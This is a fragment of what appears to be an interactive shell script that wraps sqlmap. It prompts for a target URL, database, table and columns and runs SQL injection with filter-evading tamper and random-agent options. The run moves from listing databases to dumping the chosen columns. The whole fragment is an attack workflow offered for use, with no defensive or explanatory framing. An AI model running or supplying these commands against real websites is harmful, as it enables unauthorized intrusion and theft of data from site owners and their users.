            (" Enter the URL to be browsed : ")
              ("url : ")
sqlmap -u "$url" --tamper=space2comment --level=3 --risk=3 --random-agent --time-sec=10 --batch --dbs

            (" Enter the database to be Scanned : ")
              ("db : ")
sqlmap -u "$url" --level=3 --risk=3 --random-agent --time-sec=10 -D $db --tables

            (" Enter the table to be scanned : ")
              ("tabela : ")
sqlmap -u "$url" --level=3 --risk=3 --random-agent --time-sec=10 -D $db -T $tabela --columns

            (" Enter the column (s) to be explored (s) : ")
              ("colunas : ")
sqlmap -u "$url" --level=3 --risk=3 --random-agent --time-sec=10 -D $db -T $tabela -C $colunas --dump